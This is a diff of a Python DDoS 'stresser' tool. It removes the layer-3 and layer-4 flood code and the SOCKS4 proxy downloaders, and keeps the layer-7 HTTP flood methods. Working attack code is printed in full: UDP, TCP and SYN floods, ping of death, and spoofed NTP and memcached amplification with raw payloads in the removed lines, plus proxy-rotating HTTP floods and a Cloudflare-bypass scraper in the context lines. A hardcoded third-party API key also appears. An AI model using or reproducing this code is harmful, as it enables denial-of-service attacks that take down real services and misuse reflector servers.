@@ -1,13 +1,11 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-
+import secrets
 l7 = ["CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "OSTRESS", "DYN", "SLOW", "HEAD", "HIT", "NULL", "COOKIE", "BRUST", "PPS", "EVEN", "GSB", "DGB", "AVB"]
-l4 = ["TCP", "UDP", "SYN", "VSE", "MEM", "NTP"]
-l3 = ["POD", "ICMP"]
 to = ["CFIP", "DNS", "PING", "CHECK", "DSTAT", "INFO"]
 ot = ["STOP", "TOOLS", "HELP"]
-methods = l7 + l4 + l3
-methodsl = l7 + l4 + l3 + to + ot
+methods = l7
+methodsl = l7 + to + ot
 
 
 def spoofer():
@@ -25,7 +23,7 @@ def start_attack(method, threads, event, socks_type):
     global out_file
     # layer7
     cmethod = str(method.upper())
-    if (cmethod != "HIT") and (cmethod not in l4) and (cmethod not in l3) and (cmethod != "OSTRESS"):
+    if (cmethod != "HIT")  and (cmethod != "OSTRESS"):
         out_file = str("files/proxys/" + sys.argv[5])
         proxydl(out_file, socks_type)
         print("{} Attack Started To {}:{} For {} Seconds With {}/{} Proxy ".format(method, target, port, sys.argv[7],len(proxies), str(nums)))
@@ -56,9 +54,6 @@ def start_attack(method, threads, event, socks_type):
         elif method == "cookie":
             for _ in range(threads):
                 threading.Thread(target=cookie, args=(event, socks_type), daemon=True).start()
-        elif method == "tor":
-            for _ in range(threads):
-                threading.Thread(target=tor, args=(event, socks_type), daemon=True).start()
         elif method == "bypass":
             for _ in range(threads):
                 threading.Thread(target=bypass, args=(event, socks_type), daemon=True).start()
@@ -93,34 +88,7 @@ def start_attack(method, threads, event, socks_type):
             for _ in range(threads):
                 threading.Thread(target=hit, args=(event, timer), daemon=True).start()
 
-        # layer4
 
-        elif method == "vse":
-            for _ in range(threads):
-                threading.Thread(target=vse, args=(event, timer), daemon=True).start()
-        elif method == "udp":
-            for _ in range(threads):
-                threading.Thread(target=udp, args=(event, timer), daemon=True).start()
-        elif method == "tcp":
-            for _ in range(threads):
-                threading.Thread(target=tcp, args=(event, timer), daemon=True).start()
-        elif method == "syn":
-            for _ in range(threads):
-                threading.Thread(target=syn, args=(event, timer), daemon=True).start()
-        elif method == "mem":
-            for _ in range(threads):
-                threading.Thread(target=mem, args=(event, timer), daemon=True).start()
-        elif method == "ntp":
-            for _ in range(threads):
-                threading.Thread(target=ntp, args=(event, timer), daemon=True).start()
-
-        # layer3
-        elif method == "icmp":
-            for _ in range(threads):
-                threading.Thread(target=icmp, args=(event, timer), daemon=True).start()
-        elif method == "pod":
-            for _ in range(threads):
-                threading.Thread(target=pod, args=(event, timer), daemon=True).start()
     except:
         pass
 
@@ -251,187 +219,6 @@ def UrlFixer(original_url):
         path = url.replace(website, "", 1)
 
 
-def udp(event, timer):
-    event.wait()
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    while time.time() < timer:
-        try:
-            try:
-                data = random._urandom(int(Intn(1024, 60000)))
-                for _ in range(multiple):
-                    s.sendto(data, (str(target), int(port)))
-            except:
-                s.close()
-        except:
-            s.close()
-            
-def icmp(event, timer):
-    event.wait()
-    while time.time() < timer:
-        try:
-            for _ in range(multiple):
-                packet = random._urandom(int(Intn(1024, 60000)))
-                pig(target, count=10, interval=0.2, payload_size=len(packet), payload=packet)
-        except:
-            pass
-
-ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
-
-
-def ntp(event, timer):
-    packets = Intn(10, 150)
-    server = Choice(ntpsv)
-    event.wait()
-    while time.time() < timer:
-        try:
-            packet = (
-                    IP(dst=server, src=target)
-                    / UDP(sport=Intn(1, 65535), dport=int(port))
-                    / Raw(load=ntp_payload)
-            )
-            try:
-                for _ in range(multiple):
-                    send(packet, count=packets, verbose=False)
-            except:
-                pass
-        except:
-            pass
-
-
-mem_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
-
-
-def mem(event, timer):
-    event.wait()
-    packets = Intn(1024, 60000)
-    server = Choice(memsv)
-    while time.time() < timer:
-        try:
-            try:
-                packet = (
-                        IP(dst=server, src=target)
-                        / UDP(sport=port, dport=11211)
-                        / Raw(load=mem_payload)
-                )
-                for _ in range(multiple):
-                    send(packet, count=packets, verbose=False)
-            except:
-                pass
-        except:
-            pass
-
-def tcp(event, timer):
-    event.wait()
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    while time.time() < timer:
-        try:
-            data = random._urandom(int(Intn(1024, 60000)))
-            address = (str(target), int(port))
-            try:
-                s.connect(address)
-                for _ in range(multiple):
-                    s.send(data)
-            except:
-                s.close()
-        except:
-            s.close()
-
-def vse(event, timer):
-    event.wait()
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    while time.time() < timer:
-        try:
-            address = (str(target), int(port))
-            try:
-                s.connect(address)
-                for _ in range(multiple):
-                    s.send(data)
-            except:
-                s.close()
-        except:
-            s.close()
-class DNSQuery:
-    def __init__(self, data):
-        self.data = data
-        self.dominio = ''
-        self.DnsType = ''
-
-        HDNS=data[-4:-2].encode("hex")
-        if HDNS == "0001":
-            self.DnsType='A'
-        elif HDNS == "000f":
-            self.DnsType='MX'
-        elif HDNS == "0002":
-            self.DnsType='NS'
-        elif HDNS == "0010":
-            self.DnsType="TXT"
-        else:
-            self.DnsType="Unknown"
-
-        tipo = (ord(data[2]) >> 3) & 15   # Opcode bits
-        if tipo == 0:                     # Standard query
-            ini=12
-            lon=ord(data[ini])
-            while lon != 0:
-                self.dominio+=data[ini+1:ini+lon+1]+'.'
-                ini+=lon+1
-                lon=ord(data[ini])
-    def respuesta(self, ip):
-        packet=''
-        if self.dominio:
-            packet+=self.data[:2] + "\x81\x80"
-            packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   # Questions and Answers Counts
-            packet+=self.data[12:]                                         # Original Domain Name Question
-            packet+='\xc0\x0c'                                             # Pointer to domain name
-            packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'             # Response type, ttl and resource data length -> 4 bytes
-            packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) # 4bytes of IP
-        return packet
-
-def dns(event, timer):
-    event.wait()
-    while time.time() < timer:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.bind(('',53))
-            data, addr = s.recvfrom(1024)
-            p = DNSQuery(data)
-            for _ in range(multiple):
-                s.sendto(p.respuesta(target), addr)
-        except:
-            s.close()
-            
-def syn(event, timer):
-    event.wait()
-    while time.time() < timer:
-        try:
-            IP_Packet = IP ()
-            IP_Packet.src = randomIP()
-            IP_Packet.dst = target
-
-            TCP_Packet = TCP ()
-            TCP_Packet.sport = randint(1, 65535)
-            TCP_Packet.dport = int(port)
-            TCP_Packet.flags = "S"
-            TCP_Packet.seq = randint(1000, 9000)
-            TCP_Packet.window = randint(1000, 9000)
-            for _ in range(multiple):
-                send(IP_Packet/TCP_Packet, verbose=0)
-        except:
-            pass
-
-
-def pod(event, timer):
-    event.wait()
-    while time.time() < timer:
-        try:
-            rand_addr = spoofer()
-            ip_hdr = IP(src=rand_addr, dst=target)
-            packet = ip_hdr / ICMP() / ("m" * 60000)
-            send(packet)
-        except:
-            pass
-
 
 def stop():
     print('All Attacks Stopped !')
@@ -449,8 +236,6 @@ def dyn(event, socks_type):
     while time.time() < timer:
         try:
             s = socks.socksocket()
-            if socks_type == 4:
-                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
             if socks_type == 1:
@@ -478,8 +263,6 @@ def http(event, socks_type):
     while time.time() < timer:
         try:
             s = socks.socksocket()
-            if socks_type == 4:
-                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
             if socks_type == 1:
@@ -506,8 +289,6 @@ def capb(event, socks_type):
     while time.time() < timer:
         try:
             s = socks.socksocket()
-            if socks_type == 4:
-                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
             if socks_type == 1:
@@ -534,8 +315,7 @@ def ovh(event, socks_type):
     while time.time() < timer:
         try:
             s = socks.socksocket()
-            if socks_type == 4:
-                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
             if socks_type == 1:
@@ -561,8 +341,7 @@ def pps(event, socks_type):
     while time.time() < timer:
         try:
             s = socks.socksocket()
-            if socks_type == 4:
-                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
             if socks_type == 1:
@@ -591,8 +370,7 @@ def even(event, socks_type):
     while time.time() < timer:
         try:
             s = socks.socksocket()
-            if socks_type == 4:
-                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
             if socks_type == 1:
@@ -621,8 +399,7 @@ def brust(event, socks_type):
     while time.time() < timer:
         try:
             s = socks.socksocket()
-            if socks_type == 4:
-                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
             if socks_type == 1:
@@ -650,8 +427,7 @@ def cookie(event, socks_type):
     while time.time() < timer:
         try:
             s = socks.socksocket()
-            if socks_type == 4:
-                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
             if socks_type == 1:
@@ -679,8 +455,7 @@ def cfb(event, socks_type):
     while time.time() < timer:
         try:
             s = socks.socksocket()
-            if socks_type == 4:
-                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
             if socks_type == 1:
@@ -700,11 +475,6 @@ def cfb(event, socks_type):
             s.close()
 
 
-# def tor(event, socks_type):
-    # event.wait()
-    # while time.time() < timer:
-        # with tor_requests_session() as s:
-            # s.get(sys.argv[2])
 
 
 def AVB(event, socks_type):
@@ -714,7 +484,7 @@ def AVB(event, socks_type):
     while time.time() < timer:
         try:
             s = cfscrape.create_scraper()
-            if socks_type == 5 or socks_type == 4:
+            if socks_type == 5 :
                 s.proxies['http'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
                 s.proxies['https'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
             if socks_type == 1:
@@ -738,7 +508,7 @@ def bypass(event, socks_type):
     while time.time() < timer:
         try:
             s = requests.Session()
-            if socks_type == 5 or socks_type == 4:
+            if socks_type == 5:
                 s.proxies['http'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
                 s.proxies['https'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
             if socks_type == 1:
@@ -761,7 +531,7 @@ def dgb(event, socks_type):
     while time.time() < timer:
         try:
             s = cfscrape.create_scraper()
-            if socks_type == 5 or socks_type == 4:
+            if socks_type == 5:
                 s.proxies['http'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
                 s.proxies['https'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
             if socks_type == 1:
@@ -788,8 +558,7 @@ def head(event, socks_type):
     while time.time() < timer:
         try:
             s = socks.socksocket()
-            if socks_type == 4:
-                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
             if socks_type == 1:
@@ -817,8 +586,7 @@ def null(event, socks_type):
     while time.time() < timer:
         try:
             s = socks.socksocket()
-            if socks_type == 4:
-                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
             if socks_type == 1:
@@ -846,8 +614,7 @@ def gsb(event, socks_type):
     while time.time() < timer:
         try:
             s = socks.socksocket()
-            if socks_type == 4:
-                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
             if socks_type == 1:
@@ -890,8 +657,7 @@ def cfbc(event, socks_type):
     while time.time() < timer:
         try:
             s = socks.socksocket()
-            if socks_type == 4:
-                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
             if socks_type == 1:
@@ -917,8 +683,7 @@ def post(event, socks_type):
     while time.time() < timer:
         try:
             s = socks.socksocket()
-            if socks_type == 4:
-                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
             if socks_type == 1:
@@ -944,8 +709,7 @@ def stress(event, socks_type):
     while time.time() < timer:
         try:
             s = socks.socksocket()
-            if socks_type == 4:
-                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
             if socks_type == 1:
@@ -992,8 +756,7 @@ def slow(conn, socks_type):
     while time.time() < timer:
         try:
             s = socks.socksocket()
-            if socks_type == 4:
-                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
             if socks_type == 1:
@@ -1020,17 +783,13 @@ def checking(lines, socks_type, ms):
     global nums, proxies
     proxy = lines.strip().split(":")
     if len(proxy) != 2:
-        proxies.remove(lines)
         return
     err = 0
     while True:
         if err == 3:
-            proxies.remove(lines)
             break
         try:
             s = socks.socksocket()
-            if socks_type == 4:
-                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
             if socks_type == 1:
@@ -1057,9 +816,6 @@ def check_socks(ms):
     for lines in list(proxies):
         if choice == "5":
             th = threading.Thread(target=checking, args=(lines, 5, ms,))
-            th.start()
-        if choice == "4":
-            th = threading.Thread(target=checking, args=(lines, 4, ms,))
             th.start()
         if choice == "1":
             th = threading.Thread(target=checking, args=(lines, 1, ms,))
@@ -1100,132 +856,6 @@ def check_list(socks_file):
     rfile.close()
 
 
-def downloadsocks(choice):
-    global out_file
-    if choice == "4":
-        f = open(out_file, 'wb')
-        try:
-            r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
-                             timeout=5)
-            f.write(r.content)
-        except:
-            pass
-        try:
-            r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4", timeout=5)
-            f.write(r.content)
-        except:
-            pass
-        try:
-            r = requests.get("https://www.proxyscan.io/download?type=socks4", timeout=5)
-            f.write(r.content)
-        except:
-            pass
-        try:
-            r = requests.get(
-                "https://proxy-daily.com/api/getproxylist?apikey=3Rr6lb-yfeQeotZ2-9M76QI&format=ipport&type=socks4&lastchecked=60",
-                timeout=5)
-            f.write(r.content)
-        except:
-            pass
-        try:
-            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt", timeout=5)
-            f.write(r.content)
-            f.close()
-        except:
-            pass
-        try:
-
-            req = requests.get("https://www.socks-proxy.net/", timeout=5, headers={"User-Agent", UserAgent}).text
-            part = str(req)
-            part = part.split("<tbody>")
-            part = part[1].split("</tbody>")
-            part = part[0].split("<tr><td>")
-            proxies = ""
-            for proxy in part:
-                proxy = proxy.split("</td><td>")
-                try:
-                    proxies = proxies + proxy[0] + ":" + proxy[1] + "\n"
-                except:
-                    pass
-                out_file = open(out_file, "a")
-                out_file.write(proxies)
-                out_file.close()
-        except:
-            pass
-    if choice == "5":
-        f = open(out_file, 'wb')
-        try:
-            r = requests.get("https://gist.githubusercontent.com/Xiaozhan-sb/26f42cdd65c5c14e18e92f2318f3bf04/raw/207c056e03ed5dfd68744a8d4b35823ce1cf923c/proxy.txt",
-                             timeout=5)
-            f.write(r.content)
-        except:
-            pass
-        try:
-            r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5", timeout=5)
-            f.write(r.content)
-        except:
-            pass
-        try:
-            r = requests.get("https://www.proxyscan.io/download?type=socks5", timeout=5)
-            f.write(r.content)
-            f.close()
-        except:
-            pass
-        try:
-            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt", timeout=5)
-            f.write(r.content)
-        except:
-            pass
-        try:
-            r = requests.get(
-                "https://proxy-daily.com/api/getproxylist?apikey=3Rr6lb-yfeQeotZ2-9M76QI&format=ipport&type=socks5&lastchecked=60",
-                timeout=5)
-            f.write(r.content)
-        except:
-            pass
-        try:
-            r = requests.get(
-                "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all",
-                timeout=5)
-            f.write(r.content)
-            f.close()
-        except:
-            f.close()
-    if choice == "1":
-        f = open(out_file, 'wb')
-        try:
-            r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all",
-                             timeout=5)
-            f.write(r.content)
-        except:
-            pass
-        try:
-            r = requests.get("https://www.proxy-list.download/api/v1/get?type=http", timeout=5)
-            f.write(r.content)
-            f.close()
-        except:
-            pass
-        try:
-            r = requests.get("https://www.proxyscan.io/download?type=http", timeout=5)
-            f.write(r.content)
-            f.close()
-        except:
-            pass
-        try:
-            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", timeout=5)
-            f.write(r.content)
-        except:
-            pass
-        try:
-            r = requests.get(
-                "https://proxy-daily.com/api/getproxylist?apikey=3Rr6lb-yfeQeotZ2-9M76QI&format=ipport&type=http&lastchecked=60",
-                timeout=5)
-            f.write(r.content)
-            f.close()
-        except:
-            f.close()
-
-
 def main():
     global proxies, multiple, choice, timer, out_file
     method = str(sys.argv[1]).lower()
@@ -1252,12 +882,10 @@ def main():
     url = str(sys.argv[2]).strip()
     UrlFixer(url)
     choice = str(sys.argv[3]).strip()
-    if choice != "4" and choice != "5" and choice != "1":
-        print("Socks Type Not Found [4, 5, 1]")
+    if choice != "5" and choice != "1":
+        print("Socks Type Not Found [5, 1]")
         exit()
-    if choice == "4":
-        socks_type = 4
-    elif choice == "1":
+    if choice == "1":
         socks_type = 1
     else:
         socks_type = 5
@@ -1292,13 +920,10 @@ def proxydl(out_file, socks_type):
     ms = 1
     if socks_type == 1:
         socktyper = "HTTP"
-    if socks_type == 4:
-        socktyper = "SOCKS4"
     if socks_type == 5:
         socktyper = "SOCKS5"
 
-    print("downloading {}'s proxy plz wait".format(socktyper))
-    downloadsocks(choice)
+    print("Loading {}'s proxy plz wait".format(socktyper))
     proxies = open(str(out_file)).readlines()
     check_list(out_file)
     check_socks(ms)
@@ -1449,9 +1074,9 @@ def piger(siye):
 
 
 def usgeaseets():
-    global metho, url, SOCKST, thr, proxylist, muli, tim, l7s, l4s, tos, ots, l3s
-    socks = ["1", "4", "5"]
-    sockst = ["socks4.txt", "socks5.txt", "http.txt"]
+    global metho, url, SOCKST, thr, proxylist, muli, tim, l7s, tos, ots
+    socks = ["1", "5"]
+    sockst = ["socks5.txt", "http.txt"]
     try:
         if sys.argv[3] not in socks:
             SOCKST = Choice(socks)
@@ -1479,18 +1104,6 @@ def usgeaseets():
     except:
         metho = Choice(methods).lower()
     try:
-        methos = metho.upper()
-        if (methos in l4) or (methos in l3):
-            url = sys.argv[2]
-        elif str("http") not in sys.argv[2]:
-            url = "https://example.ir"
-        elif sys.argv[2]:
-            url = sys.argv[2]
-        else:
-            url = "https://example.ir"
-    except:
-        url = "https://example.ir"
-    try:
         if sys.argv[4]:
             thr = sys.argv[4]
         else:
@@ -1503,7 +1116,7 @@ def usgeaseets():
     except IndexError:
         pass
     except:
-        print('socks type not found')
+        print('Unknown Socks')
         exit()
 
     try:
@@ -1521,8 +1134,6 @@ def usgeaseets():
     except:
         tim = Intn(10, 10000)
 
-    l4s = str(l4).replace("'", "").replace("[", "").replace("]", "")
-    l3s = str(l3).replace("'", "").replace("[", "").replace("]", "")
     l7s = str(l7).replace("'", "").replace("[", "").replace("]", "")
     tos = str(to).replace("'", "").replace("[", "").replace("]", "")
     ots = str(ot).replace("'", "").replace("[", "").replace("]", "")
@@ -1530,13 +1141,9 @@ def usgeaseets():
 
 def usge():
     usgeaseets()
-    print('* Coded By MH_ProDev For Better Stresser')
-    print('python3 {} <method> <url> <socks_type5.4.1> <threads> <proxylist> <multiple> <timer>\n'.format(sys.argv[0]))
+    print('* Coded For Better Stresser,Modified Layer7 By Xiao Zhan（Fried prawns）&Wu Yiyan（Canada Electric eel）')
+    print('python3 {} <method> <url> <socks_type5  or 1（1=HTTP）> <threads> <proxylist> <multiple> <timer>\n'.format(sys.argv[0]))
     print(' > Methods:')
-    print(' - L3')
-    print(' | {} | {} Methods'.format(l3s, len(l3)))
-    print(' - L4')
-    print(' | {} | {} Methods'.format(l4s, len(l4)))
     print(' - L7')
     print(' | {} | {} Methods'.format(l7s, len(l7)))
     print(' - TOOLS')
@@ -1544,9 +1151,6 @@ def usge():
     print(' - Other')
     print(' | {} | {} Methods'.format(ots, len(ot)))
     print(' - All {} Method \n'.format(len(methodsl)))
-    print(
-        'expmple:\n python3 {} {} {} {} {} {} {} {}'.format(sys.argv[0], metho, url, SOCKST, thr, proxylist, muli, tim))
-
 
 def makefile(text):
     if text == "files/":
@@ -1592,10 +1196,6 @@ if __name__ == '__main__':
         makefile('files/proxys/')
     if not os.path.exists('files/useragent.txt'):
         makefile('files/proxys/useragent.txt')
-    if not os.path.exists('files/ntp_servers.txt'):
-        makefile('files/ntp_servers.txt')
-    if not os.path.exists('files/memcached_servers.txt'):
-        makefile('files/memcached_servers.txt')
     if not os.path.exists('files/referers.txt'):
         makefile('files/referers.txt')
     try:
@@ -1603,13 +1203,8 @@ if __name__ == '__main__':
             readuser = str(f.readlines()).replace('\n', '').replace('\r', '')
         with open("files/referers.txt", "r") as f:
             readref = str(f.readlines()).replace('\n', '').replace('\r', '')
-        with open("files/memcached_servers.txt", "r") as f:
-            memsv = str(f.readlines()).replace('\n', '').replace('\r', '')
-        with open("files/ntp_servers.txt", "r") as f:
-            ntpsv = str(f.readlines()).replace('\n', '').replace('\r', '')
         UserAgent = Choice(readuser)
         referers = Choice(readref)
-        memcached_servers = Choice(memsv)
         try:
             bdr = str(sys.argv[1]).lower()
             if bdr == "tools":
